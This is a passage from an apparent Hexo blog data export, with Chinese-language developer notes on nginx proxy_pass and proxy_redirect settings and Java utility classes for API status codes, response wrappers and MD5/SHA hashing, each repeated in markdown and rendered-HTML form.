200(接口返回)<br><br>使用 4 时<br><br>和 3 一样， 跳转时不会自动加上 location 中 url, 而是使用 proxy_pass 中 url<br></p>\n<p>总结: 在匹配时，location中url后面加不加 / 没用影响，但是 proxy_pass 中 url 不加 / 会默认加上 location中url跳转， 加上 / 则不会带上 location中 url 跳转.<br></p>\n<h2 id=\"3-重定向-proxy-redirect\"><a href=\"#3-重定向-proxy-redirect\" class=\"headerlink\" title=\"3.重定向 proxy_redirect\"></a>3.重定向 proxy_redirect</h2><p>当服务返回重定向时（http code为301或302），浏览器会根据response中的location字段进行跳转(浏览器直接跳转到服务地址).<br><br>此时，为了能让跳转经过nginx,可以使用 proxy_redirect 修改location的重定向信息.<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 1 重定向到 其它location</span><br><span class=\"line\">location /portal&#123;</span><br><span class=\"line\">proxy_set_header Host $host:$server_port;</span><br><span class=\"line\">proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class=\"line\">proxy_set_header msec $msec;</span><br><span class=\"line\">proxy_pass http://portal;</span><br><span class=\"line\">index index.html index.htm;</span><br><span class=\"line\">proxy_redirect  http://10.191.21.105:8090/cas /cas;</span><br><span class=\"line\">proxy_redirect  http://10.191.21.105:8090/portal  /portal;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># 2 重定向到具体地址</span><br><span class=\"line\">location /cas&#123;</span><br><span class=\"line\">proxy_set_header Host $host:$server_port;</span><br><span class=\"line\">proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class=\"line\">proxy_set_header msec $msec;</span><br><span class=\"line\">proxy_pass http://cas;</span><br><span class=\"line\">index index.html index.htm;</span><br><span class=\"line\">proxy_redirect  http://10.191.21.105:8090/portal  http://ip/port/path;</span><br><span class=\"line\">...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"返回消息","date":"2019-03-12T20:40:31.000Z","_content":"### 1.状态\n```\npublic class StatusCode {\n    private int status;\n    private String message;\n\n    public static StatusCode SUCCESS = new StatusCode(200,\"SUCCESS\");\n\n    public static StatusCode INVALID_REQUEST = new StatusCode(400,\"请求有误\");\n    public static StatusCode UNAUTHORIZED_ERROR = new StatusCode(401,\"权限错误\");\n    public static StatusCode FORBIDDEN  = new StatusCode(403,\"禁止访问\");\n    public static StatusCode NOT_FOUND  = new StatusCode(404,\"找不到对应地址\");\n    public static StatusCode NOT_ACCEPTABLE = new StatusCode(406,\"请求参数格式不对,json/xml?\");\n    public static StatusCode PARAMS_VALID_EXCEPTION = new StatusCode(422,\"参数校验异常，未通过\");\n    public static StatusCode ALEADY_EXIST= new StatusCode(4223,\"该xx已存在\");\n    public static StatusCode SERVER_EXCEPTION = new StatusCode(500,\"服务端处理发生错误\");\n    public static StatusCode UNEXPECTED_FINISHED = new StatusCode(511,\"操作未正常完成\");\n\n    public static StatusCode EXCEPTION_DATABASE = new StatusCode(\"数据库操作发生异常\");\n    public static StatusCode EXCEPTION_DEAL = new StatusCode(\"处理流程中发生异常\");\n\n    private StatusCode(String message){\n        this.message = message;\n    }\n    private StatusCode(int status, String message) {\n        this.status = status;\n        this.message = message;\n    }\n    public int getStatus() {\n        return this.status;\n    }\n    public String getMessage() {\n        return message;\n    }\n    //用于提示消息拓展\n    public void setMessage(String message) {\n        this.message = message;\n    }\n\n}\n\n```\n### 2.返回\n```\npublic class ResultMessage<T>{\n    //提示信息\n    private String message;\n    //状态\n    private int status;\n    //返回消息内容\n    private T data;\n\n    private ResultMessage(T data) {\n        this.status = 200;\n        this.message = \"sucess\";\n        this.data = data;\n    }\n    private ResultMessage(StatusCode statusCode){\n        this.status = statusCode.getStatus();\n        this.message = statusCode.getMessage();\n    }\n\n    /**\n     * 成功时候的调用\n     * @return\n     */\n    public static <T> ResultMessage<T> success(T data){\n        return new ResultMessage<>(data);\n    }\n\n\n    /**\n     * 成功，不需要传入参数\n     * @return\n     */\n    @SuppressWarnings(\"unchecked\")\n    public static <T> ResultMessage<T> success(){\n        return (ResultMessage<T>) success(\"\");\n    }\n    /**\n     * 失败时候的调用\n     * @return\n     */\n    public static <T> ResultMessage<T> error(StatusCode statusCode){\n        return new ResultMessage<T>(statusCode);\n    }\n    /**\n     * 失败时候的调用,扩展消息参数\n     * @param statusCode\n     * @param msg\n     * @return\n     */\n    public static <T> ResultMessage<T> error(StatusCode statusCode,String msg){\n        statusCode.setMessage(statusCode.getMessage()+\"--\"+msg);\n        return new ResultMessage<>(statusCode);\n    }\n\n    public T getData() {\n        return data;\n    }\n    public String getMessage() {\n        return message;\n    }\n    public int getStatus() {\n        return status;\n    }\n\n}\n\n```\n","source":"_posts/wheels/java/ResultMessage封装.md","raw":"---\ntitle: 返回消息\ndate: 2019-3-12 16:40:31\ntags: [wheels]\n---\n### 1.状态\n```\npublic class StatusCode {\n    private int status;\n    private String message;\n\n    public static StatusCode SUCCESS = new StatusCode(200,\"SUCCESS\");\n\n    public static StatusCode INVALID_REQUEST = new StatusCode(400,\"请求有误\");\n    public static StatusCode UNAUTHORIZED_ERROR = new StatusCode(401,\"权限错误\");\n    public static StatusCode FORBIDDEN  = new StatusCode(403,\"禁止访问\");\n    public static StatusCode NOT_FOUND  = new StatusCode(404,\"找不到对应地址\");\n    public static StatusCode NOT_ACCEPTABLE = new StatusCode(406,\"请求参数格式不对,json/xml?\");\n    public static StatusCode PARAMS_VALID_EXCEPTION = new StatusCode(422,\"参数校验异常，未通过\");\n    public static StatusCode ALEADY_EXIST= new StatusCode(4223,\"该xx已存在\");\n    public static StatusCode SERVER_EXCEPTION = new StatusCode(500,\"服务端处理发生错误\");\n    public static StatusCode UNEXPECTED_FINISHED = new StatusCode(511,\"操作未正常完成\");\n\n    public static StatusCode EXCEPTION_DATABASE = new StatusCode(\"数据库操作发生异常\");\n    public static StatusCode EXCEPTION_DEAL = new StatusCode(\"处理流程中发生异常\");\n\n    private StatusCode(String message){\n        this.message = message;\n    }\n    private StatusCode(int status, String message) {\n        this.status = status;\n        this.message = message;\n    }\n    public int getStatus() {\n        return this.status;\n    }\n    public String getMessage() {\n        return message;\n    }\n    //用于提示消息拓展\n    public void setMessage(String message) {\n        this.message = message;\n    }\n\n}\n\n```\n### 2.返回\n```\npublic class ResultMessage<T>{\n    //提示信息\n    private String message;\n    //状态\n    private int status;\n    //返回消息内容\n    private T data;\n\n    private ResultMessage(T data) {\n        this.status = 200;\n        this.message = \"sucess\";\n        this.data = data;\n    }\n    private ResultMessage(StatusCode statusCode){\n        this.status = statusCode.getStatus();\n        this.message = statusCode.getMessage();\n    }\n\n    /**\n     * 成功时候的调用\n     * @return\n     */\n    public static <T> ResultMessage<T> success(T data){\n        return new ResultMessage<>(data);\n    }\n\n\n    /**\n     * 成功，不需要传入参数\n     * @return\n     */\n    @SuppressWarnings(\"unchecked\")\n    public static <T> ResultMessage<T> success(){\n        return (ResultMessage<T>) success(\"\");\n    }\n    /**\n     * 失败时候的调用\n     * @return\n     */\n    public static <T> ResultMessage<T> error(StatusCode statusCode){\n        return new ResultMessage<T>(statusCode);\n    }\n    /**\n     * 失败时候的调用,扩展消息参数\n     * @param statusCode\n     * @param msg\n     * @return\n     */\n    public static <T> ResultMessage<T> error(StatusCode statusCode,String msg){\n        statusCode.setMessage(statusCode.getMessage()+\"--\"+msg);\n        return new ResultMessage<>(statusCode);\n    }\n\n    public T getData() {\n        return data;\n    }\n    public String getMessage() {\n        return message;\n    }\n    public int getStatus() {\n        return status;\n    }\n\n}\n\n```\n","slug":"wheels/java/ResultMessage封装","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321lt00506dcplxhnfnvw","content":"<h3 id=\"1-状态\"><a href=\"#1-状态\" class=\"headerlink\" title=\"1.状态\"></a>1.状态</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class StatusCode &#123;</span><br><span class=\"line\">    private int status;</span><br><span class=\"line\">    private String message;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static StatusCode SUCCESS = new StatusCode(200,&quot;SUCCESS&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    public static StatusCode INVALID_REQUEST = new StatusCode(400,&quot;请求有误&quot;);</span><br><span class=\"line\">    public static StatusCode UNAUTHORIZED_ERROR = new StatusCode(401,&quot;权限错误&quot;);</span><br><span class=\"line\">    public static StatusCode FORBIDDEN  = new StatusCode(403,&quot;禁止访问&quot;);</span><br><span class=\"line\">    public static StatusCode NOT_FOUND  = new StatusCode(404,&quot;找不到对应地址&quot;);</span><br><span class=\"line\">    public static StatusCode NOT_ACCEPTABLE = new StatusCode(406,&quot;请求参数格式不对,json/xml?&quot;);</span><br><span class=\"line\">    public static StatusCode PARAMS_VALID_EXCEPTION = new StatusCode(422,&quot;参数校验异常，未通过&quot;);</span><br><span class=\"line\">    public static StatusCode ALEADY_EXIST= new StatusCode(4223,&quot;该xx已存在&quot;);</span><br><span class=\"line\">    public static StatusCode SERVER_EXCEPTION = new StatusCode(500,&quot;服务端处理发生错误&quot;);</span><br><span class=\"line\">    public static StatusCode UNEXPECTED_FINISHED = new StatusCode(511,&quot;操作未正常完成&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    public static StatusCode EXCEPTION_DATABASE = new StatusCode(&quot;数据库操作发生异常&quot;);</span><br><span class=\"line\">    public static StatusCode EXCEPTION_DEAL = new StatusCode(&quot;处理流程中发生异常&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    private StatusCode(String message)&#123;</span><br><span class=\"line\">        this.message = message;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    private StatusCode(int status, String message) &#123;</span><br><span class=\"line\">        this.status = status;</span><br><span class=\"line\">        this.message = message;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public int getStatus() &#123;</span><br><span class=\"line\">        return this.status;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public String getMessage() &#123;</span><br><span class=\"line\">        return message;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //用于提示消息拓展</span><br><span class=\"line\">    public void setMessage(String message) &#123;</span><br><span class=\"line\">        this.message = message;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-返回\"><a href=\"#2-返回\" class=\"headerlink\" title=\"2.返回\"></a>2.返回</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class ResultMessage&lt;T&gt;&#123;</span><br><span class=\"line\">    //提示信息</span><br><span class=\"line\">    private String message;</span><br><span class=\"line\">    //状态</span><br><span class=\"line\">    private int status;</span><br><span class=\"line\">    //返回消息内容</span><br><span class=\"line\">    private T data;</span><br><span class=\"line\"></span><br><span class=\"line\">    private ResultMessage(T data) &#123;</span><br><span class=\"line\">        this.status = 200;</span><br><span class=\"line\">        this.message = &quot;sucess&quot;;</span><br><span class=\"line\">        this.data = data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    private ResultMessage(StatusCode statusCode)&#123;</span><br><span class=\"line\">        this.status = statusCode.getStatus();</span><br><span class=\"line\">        this.message = statusCode.getMessage();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 成功时候的调用</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public static &lt;T&gt; ResultMessage&lt;T&gt; success(T data)&#123;</span><br><span class=\"line\">        return new ResultMessage&lt;&gt;(data);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 成功，不需要传入参数</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class=\"line\">    public static &lt;T&gt; ResultMessage&lt;T&gt; success()&#123;</span><br><span class=\"line\">        return (ResultMessage&lt;T&gt;) success(&quot;&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 失败时候的调用</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public static &lt;T&gt; ResultMessage&lt;T&gt; error(StatusCode statusCode)&#123;</span><br><span class=\"line\">        return new ResultMessage&lt;T&gt;(statusCode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 失败时候的调用,扩展消息参数</span><br><span class=\"line\">     * @param statusCode</span><br><span class=\"line\">     * @param msg</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public static &lt;T&gt; ResultMessage&lt;T&gt; error(StatusCode statusCode,String msg)&#123;</span><br><span class=\"line\">        statusCode.setMessage(statusCode.getMessage()+&quot;--&quot;+msg);</span><br><span class=\"line\">        return new ResultMessage&lt;&gt;(statusCode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public T getData() &#123;</span><br><span class=\"line\">        return data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public String getMessage() &#123;</span><br><span class=\"line\">        return message;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public int getStatus() &#123;</span><br><span class=\"line\">        return status;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1-状态\"><a href=\"#1-状态\" class=\"headerlink\" title=\"1.状态\"></a>1.状态</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class StatusCode &#123;</span><br><span class=\"line\">    private int status;</span><br><span class=\"line\">    private String message;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static StatusCode SUCCESS = new StatusCode(200,&quot;SUCCESS&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    public static StatusCode INVALID_REQUEST = new StatusCode(400,&quot;请求有误&quot;);</span><br><span class=\"line\">    public static StatusCode UNAUTHORIZED_ERROR = new StatusCode(401,&quot;权限错误&quot;);</span><br><span class=\"line\">    public static StatusCode FORBIDDEN  = new StatusCode(403,&quot;禁止访问&quot;);</span><br><span class=\"line\">    public static StatusCode NOT_FOUND  = new StatusCode(404,&quot;找不到对应地址&quot;);</span><br><span class=\"line\">    public static StatusCode NOT_ACCEPTABLE = new StatusCode(406,&quot;请求参数格式不对,json/xml?&quot;);</span><br><span class=\"line\">    public static StatusCode PARAMS_VALID_EXCEPTION = new StatusCode(422,&quot;参数校验异常，未通过&quot;);</span><br><span class=\"line\">    public static StatusCode ALEADY_EXIST= new StatusCode(4223,&quot;该xx已存在&quot;);</span><br><span class=\"line\">    public static StatusCode SERVER_EXCEPTION = new StatusCode(500,&quot;服务端处理发生错误&quot;);</span><br><span class=\"line\">    public static StatusCode UNEXPECTED_FINISHED = new StatusCode(511,&quot;操作未正常完成&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    public static StatusCode EXCEPTION_DATABASE = new StatusCode(&quot;数据库操作发生异常&quot;);</span><br><span class=\"line\">    public static StatusCode EXCEPTION_DEAL = new StatusCode(&quot;处理流程中发生异常&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    private StatusCode(String message)&#123;</span><br><span class=\"line\">        this.message = message;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    private StatusCode(int status, String message) &#123;</span><br><span class=\"line\">        this.status = status;</span><br><span class=\"line\">        this.message = message;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public int getStatus() &#123;</span><br><span class=\"line\">        return this.status;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public String getMessage() &#123;</span><br><span class=\"line\">        return message;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //用于提示消息拓展</span><br><span class=\"line\">    public void setMessage(String message) &#123;</span><br><span class=\"line\">        this.message = message;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-返回\"><a href=\"#2-返回\" class=\"headerlink\" title=\"2.返回\"></a>2.返回</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class ResultMessage&lt;T&gt;&#123;</span><br><span class=\"line\">    //提示信息</span><br><span class=\"line\">    private String message;</span><br><span class=\"line\">    //状态</span><br><span class=\"line\">    private int status;</span><br><span class=\"line\">    //返回消息内容</span><br><span class=\"line\">    private T data;</span><br><span class=\"line\"></span><br><span class=\"line\">    private ResultMessage(T data) &#123;</span><br><span class=\"line\">        this.status = 200;</span><br><span class=\"line\">        this.message = &quot;sucess&quot;;</span><br><span class=\"line\">        this.data = data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    private ResultMessage(StatusCode statusCode)&#123;</span><br><span class=\"line\">        this.status = statusCode.getStatus();</span><br><span class=\"line\">        this.message = statusCode.getMessage();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 成功时候的调用</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public static &lt;T&gt; ResultMessage&lt;T&gt; success(T data)&#123;</span><br><span class=\"line\">        return new ResultMessage&lt;&gt;(data);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 成功，不需要传入参数</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class=\"line\">    public static &lt;T&gt; ResultMessage&lt;T&gt; success()&#123;</span><br><span class=\"line\">        return (ResultMessage&lt;T&gt;) success(&quot;&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 失败时候的调用</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public static &lt;T&gt; ResultMessage&lt;T&gt; error(StatusCode statusCode)&#123;</span><br><span class=\"line\">        return new ResultMessage&lt;T&gt;(statusCode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 失败时候的调用,扩展消息参数</span><br><span class=\"line\">     * @param statusCode</span><br><span class=\"line\">     * @param msg</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public static &lt;T&gt; ResultMessage&lt;T&gt; error(StatusCode statusCode,String msg)&#123;</span><br><span class=\"line\">        statusCode.setMessage(statusCode.getMessage()+&quot;--&quot;+msg);</span><br><span class=\"line\">        return new ResultMessage&lt;&gt;(statusCode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public T getData() &#123;</span><br><span class=\"line\">        return data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public String getMessage() &#123;</span><br><span class=\"line\">        return message;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public int getStatus() &#123;</span><br><span class=\"line\">        return status;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"hashutil","date":"2019-01-15T21:22:19.000Z","_content":"```\npackage util;\n\nimport java.io.UnsupportedEncodingException;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Random;\n\n/**\n * hash(散列),把一些不同长度的输入，转换成相同长度的输出。不可逆，且高度离散性（改变一点点，结果相差很大），导致不可预测.\n * 生成的hash值称为 摘要 ， 摘要 不等于 加密。 加密是通过加密算法将明文转成密文，密文可以通过解密算法还原成明文。\n */\npublic class HashUtil {\n\n    /**\n     * 生成六位随机数\n     * @return\n     */\n    public String creatRandom(){\n        Random random = new Random();\n        String result=\"\";\n        for (int i=0;i<6;i++)\n        {\n            result+=random.nextInt(10);\n        }\n        return result;\n    }\n\n    //通过getInstance()传入MD5,SHA-1,SHA-256,SHA-512等来选择不同算法\n    public static  String getMd5(String str, String... type){\n        MessageDigest messageDigest = null;\n        try {\n            //返回指定算法的MessageDigest对象 抛出NoSuchAlgorithmException\n            //messageDigest = MessageDigest.getInstance(\"SHA-512\");\n            //messageDigest = MessageDigest.getInstance(\"MD5\");\n            messageDigest = (type.length == 0) ? MessageDigest.getInstance(\"MD5\") : MessageDigest.getInstance(type[0]);\n            //重置摘要\n            messageDigest.reset();\n            //使用指定的字节数组或buffer更新摘要,抛出UnsupportEncodingException\n            messageDigest.update(str.getBytes(\"UTF-8\"));\n        }catch (NoSuchAlgorithmException e1){\n            e1.printStackTrace();\n        }catch (UnsupportedEncodingException e2){\n            e2.printStackTrace();\n        }\n        //进行hash计算,byte为8位二进制补码表示的，有符号整数(127到-128)\n        byte[] md5byte = messageDigest.digest();\n\n        StringBuffer md5Str = new StringBuffer();\n        for(int i=0; i<md5byte.length; i++){\n            //int类型为32位，byte为8位（byte转int时高24位为1），用0xFF（高24位全补0）进行与运算，保持其补码不变\n            if(Integer.toHexString(0xFF & md5byte[i]).length() == 1){\n                //位运算后为1位十六进制情况,前面补0\n                md5Str.append(\"0\").append(Integer.toHexString(0xFF & md5byte[i]));\n            }else {\n                //位运算后为2位十六进制情况，直接append\n                md5Str.append(Integer.toHexString(0xFF & md5byte[i]));\n            }\n        }\n        return md5Str.toString();\n    }\n\n    public static  void main(String[] args){\n        System.out.println(getMd5(\"adminbonc123\"));\n    }\n}\n\n```\n","source":"_posts/wheels/java/hashutil.md","raw":"---\ntitle: hashutil\ndate: 2019-01-15 16:22:19\ntags: [wheels,java]\n---\n```\npackage util;\n\nimport java.io.UnsupportedEncodingException;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Random;\n\n/**\n * hash(散列),把一些不同长度的输入，转换成相同长度的输出。不可逆，且高度离散性（改变一点点，结果相差很大），导致不可预测.\n * 生成的hash值称为 摘要 ， 摘要 不等于 加密。 加密是通过加密算法将明文转成密文，密文可以通过解密算法还原成明文。\n */\npublic class HashUtil {\n\n    /**\n     * 生成六位随机数\n     * @return\n     */\n    public String creatRandom(){\n        Random random = new Random();\n        String result=\"\";\n        for (int i=0;i<6;i++)\n        {\n            result+=random.nextInt(10);\n        }\n        return result;\n    }\n\n    //通过getInstance()传入MD5,SHA-1,SHA-256,SHA-512等来选择不同算法\n    public static  String getMd5(String str, String... type){\n        MessageDigest messageDigest = null;\n        try {\n            //返回指定算法的MessageDigest对象 抛出NoSuchAlgorithmException\n            //messageDigest = MessageDigest.getInstance(\"SHA-512\");\n            //messageDigest = MessageDigest.getInstance(\"MD5\");\n            messageDigest = (type.length == 0) ? MessageDigest.getInstance(\"MD5\") : MessageDigest.getInstance(type[0]);\n            //重置摘要\n            messageDigest.reset();\n            //使用指定的字节数组或buffer更新摘要,抛出UnsupportEncodingException\n            messageDigest.update(str.getBytes(\"UTF-8\"));\n        }catch (NoSuchAlgorithmException e1){\n            e1.printStackTrace();\n        }catch (UnsupportedEncodingException e2){\n            e2.printStackTrace();\n        }\n        